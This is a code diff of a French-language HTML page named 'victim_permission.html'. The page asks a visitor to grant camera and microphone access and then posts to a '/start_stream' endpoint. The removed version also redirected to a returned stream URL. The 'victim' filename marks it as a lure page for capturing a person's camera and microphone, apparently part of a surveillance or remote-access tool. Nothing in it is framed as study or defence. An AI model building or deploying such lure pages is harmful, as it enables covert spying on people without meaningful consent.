@@ -1,29 +1,23 @@
-<!-- victim_permission.html -->
 <!DOCTYPE html>
-<html lang="fr">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Autorisation de la caméra et du micro</title>
+    <title>Permission Requise</title>
 </head>
 <body>
-    <h1>Veuillez autoriser l'accès à votre caméra et à votre micro</h1>
-    <video id="video" width="320" height="240" autoplay></video>
+    <h1>Autorisez l'accès à votre caméra et microphone</h1>
+    <button onclick="requestPermissions()">Donner l'autorisation</button>
+
     <script>
-        // Demande d'accès à la caméra et au micro
-        navigator.mediaDevices.getUserMedia({ video: true, audio: true })
-            .then(function(stream) {
-                document.getElementById('video').srcObject = stream;
-                // Lorsque l'utilisateur autorise, démarrer le flux
-                fetch("/start_stream", { method: "POST" })
-                    .then(response => response.json())
-                    .then(data => {
-                        window.location.href = data.stream_url;
-                    });
-            })
-            .catch(function(error) {
-                alert("Accès à la caméra et au micro refusé.");
-            });
+        function requestPermissions() {
+            navigator.mediaDevices.getUserMedia({ video: true, audio: true })
+                .then(function (stream) {
+                    alert("Permissions accordées !");
+                    fetch('/start_stream', { method: 'POST' });
+                })
+                .catch(function (error) {
+                    alert("Permissions refusées !");
+                });
+        }
     </script>
 </body>
 </html>
